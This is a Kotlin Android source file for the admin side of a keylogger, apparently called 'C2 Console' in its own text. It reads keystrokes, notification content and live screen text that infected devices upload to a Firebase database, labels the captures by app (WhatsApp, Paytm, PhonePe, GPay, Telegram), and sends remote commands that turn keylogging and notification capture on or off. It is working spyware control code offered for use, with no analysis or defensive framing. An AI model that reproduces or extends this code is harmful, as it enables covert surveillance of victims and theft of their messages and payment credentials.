package com.example.mykeyboardadmin

import android.os.Bundle
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AdminMainActivity : AppCompatActivity() {

    private lateinit var recyclerView: RecyclerView
    private lateinit var txtTotalDevices: TextView
    private lateinit var txtTotalEvents: TextView

    private val deviceList = mutableListOf<DeviceModel>()
    private lateinit var adapter: DeviceAdapter
    private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"

    data class DeviceModel(
        val name: String,
        var keylogging: Boolean = true,
        var notifications: Boolean = true,
        var liveScreenState: String = "Live Screen: Waiting...",
        var isExpanded: Boolean = false,
        var logFeed: String = "Waiting for device activity..."
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(R.layout.activity_admin_main)

        txtTotalDevices = findViewById<TextView>(R.id.txtTotalDevices)
        txtTotalEvents = findViewById<TextView>(R.id.txtTotalEvents)

        val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
        btnRefresh.setOnClickListener {
            loadConnectedDevices()
            Toast.makeText(this, "C2 Console synced!", Toast.LENGTH_SHORT).show()
        }

        recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
        recyclerView.layoutManager = LinearLayoutManager(this)
        adapter = DeviceAdapter(deviceList) { device, type, newState ->
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
            if (type == "key") {
                ref.child("keylogging").setValue(newState)
                ref.child("status").child("keylogging").setValue(newState)
            } else {
                ref.child("notifications").setValue(newState)
                ref.child("status").child("notifications").setValue(newState)
            }
            Toast.makeText(this, "Command sent to ${device.name}", Toast.LENGTH_SHORT).show()
        }
        recyclerView.adapter = adapter

        loadConnectedDevices()
    }

    private fun loadConnectedDevices() {
        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
        dbRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                var totalEvents = 0

                for (child in snapshot.children) {
                    val deviceName = child.key ?: continue
                    if (deviceList.none { it.name == deviceName }) {
                        val device = DeviceModel(deviceName)
                        deviceList.add(device)
                        listenToDeviceState(deviceName)
                        listenToDeviceLogs(deviceName)
                        listenToLiveScreen(deviceName)
                    }
                    for (appChild in child.children) {
                        if (appChild.key == "live_screen") continue
                        for (entry in appChild.children) {
                            totalEvents++
                        }
                    }
                }

                txtTotalDevices.text = deviceList.size.toString()
                txtTotalEvents.text = totalEvents.toString()
                adapter.notifyDataSetChanged()
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun parseTimestamp(value: Any?): Long? {
        return when (value) {
            is Long -> value
            is Number -> value.toLong()
            is String -> value.toLongOrNull()
            else -> null
        }
    }

    private fun listenToDeviceState(deviceName: String) {
        val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
        
        cmdRef.child("keylogging").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("keylogging").setValue(true) 
        }
        cmdRef.child("notifications").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("notifications").setValue(true) 
        }

        cmdRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val keyObj = snapshot.child("status").child("keylogging").value
                    ?: snapshot.child("keylogging").value
                val key = when (keyObj) {
                    is Boolean -> keyObj
                    is String -> keyObj.toBoolean()
                    else -> true
                }

                val notifObj = snapshot.child("status").child("notifications").value
                    ?: snapshot.child("notifications").value
                val notif = when (notifObj) {
                    is Boolean -> notifObj
                    is String -> notifObj.toBoolean()
                    else -> true
                }

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].keylogging = key
                    deviceList[index].notifications = notif
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenToLiveScreen(deviceName: String) {
        val teleRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName).child("live_screen")
        teleRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val screenText = snapshot.child("screenText").getValue(String::class.java)
                val pkg = snapshot.child("packageName").getValue(String::class.java) ?: ""
                val prettyApp = getPrettyAppName(pkg)

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1 && !screenText.isNullOrBlank()) {
                    deviceList[index].liveScreenState = "Live Screen [$prettyApp]: $screenText"
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun getPrettyAppName(pkg: String): String {
        return when {
            pkg.contains("whatsapp", true) -> "WhatsApp"
            pkg.contains("paytm", true) -> "Paytm"
            pkg.contains("phonepe", true) -> "PhonePe"
            pkg.contains("paisa", true) -> "GPay"
            pkg.contains("navi", true) -> "Navi"
            pkg.contains("chrome", true) -> "Chrome"
            pkg.contains("youtube", true) -> "YouTube"
            pkg.contains("instagram", true) -> "Instagram"
            pkg.contains("dialer", true) -> "Phone"
            pkg.contains("telegram", true) -> "Telegram"
            pkg.contains("settings", true) -> "Settings"
            else -> pkg.substringAfterLast('.')
        }
    }

    private fun listenToDeviceLogs(deviceName: String) {
        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
        logRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val entries = mutableListOf<Triple<Long, String, String>>()
                val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

                for (appChild in snapshot.children) {
                    val rawApp = appChild.key ?: continue
                    if (rawApp.startsWith("notification_", true)) continue
                    if (rawApp == "live_screen") continue
                    val prettyApp = getPrettyAppName(rawApp)
                    for (entry in appChild.children) {
                        val text = entry.child("text").getValue(String::class.java)
                            ?: entry.child("title").getValue(String::class.java)
                            ?: entry.child("typedContent").getValue(String::class.java)
                            ?: continue

                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()

                        if (text.isNotBlank() && text != "null") {
                            entries.add(Triple(timestampMillis, prettyApp, text))
                        }
                    }
                }

                // Sort newest on top
                entries.sortByDescending { it.first }

                val sb = StringBuilder()
                for (item in entries) {
                    val dateStr = dateTimeFormat.format(Date(item.first))
                    sb.append("[$dateStr] [${item.second}] ${item.third}\n")
                }

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    class DeviceAdapter(
        private val devices: List<DeviceModel>,
        private val onToggle: (DeviceModel, String, Boolean) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val txtDeviceName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
            val txtDeviceSub: TextView = view.findViewById<TextView>(R.id.txtDeviceSub)
            val txtPresencePill: TextView = view.findViewById<TextView>(R.id.txtPresencePill)
            val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
            val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
            val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
            val scrollView: View = view.findViewById<View>(R.id.logScrollView)
            val txtLiveScreenState: TextView = view.findViewById<TextView>(R.id.txtLiveScreenState)
            val layoutDeviceHeader: View = view.findViewById<View>(R.id.layoutDeviceHeader)
            val layoutLogContainer: View = view.findViewById<View>(R.id.layoutLogContainer)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_device_control, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = devices[position]
            holder.txtDeviceName.text = "💻 ${device.name}"

            if (device.keylogging) {
                holder.btnKey.text = "KEY_LOG: ON"
                holder.btnKey.setBackgroundResource(R.drawable.btn_green_rounded)
            } else {
                holder.btnKey.text = "KEY_LOG: OFF"
                holder.btnKey.setBackgroundResource(R.drawable.btn_red_rounded)
            }

            if (device.notifications) {
                holder.btnNotif.text = "NOTIF_LOG: ON"
                holder.btnNotif.setBackgroundResource(R.drawable.btn_green_rounded)
            } else {
                holder.btnNotif.text = "NOTIF_LOG: OFF"
                holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
            }

            // Bind Live Screen State
            holder.txtLiveScreenState.text = device.liveScreenState

            // Collapse/Expand log area based on click on device header
            if (device.isExpanded) {
                holder.layoutLogContainer.visibility = View.VISIBLE
                holder.txtDeviceSub.text = "Tap to collapse logs"

                holder.scrollView.setOnTouchListener { v, event ->
                    when (event.action) {
                        MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
                            v.parent.requestDisallowInterceptTouchEvent(true)
                        }
                        MotionEvent.ACTION_UP -> {
                            v.parent.requestDisallowInterceptTouchEvent(false)
                        }
                    }
                    false
                }
                holder.txtLog.text = device.logFeed
            } else {
                holder.layoutLogContainer.visibility = View.GONE
                holder.txtDeviceSub.text = "Tap to expand/collapse logs"
            }

            holder.layoutDeviceHeader.setOnClickListener {
                device.isExpanded = !device.isExpanded
                notifyItemChanged(position)
            }

            holder.btnKey.setOnClickListener {
                onToggle(device, "key", !device.keylogging)
            }

            holder.btnNotif.setOnClickListener {
                onToggle(device, "notif", !device.notifications)
            }
        }

        override fun getItemCount() = devices.size
    }
}
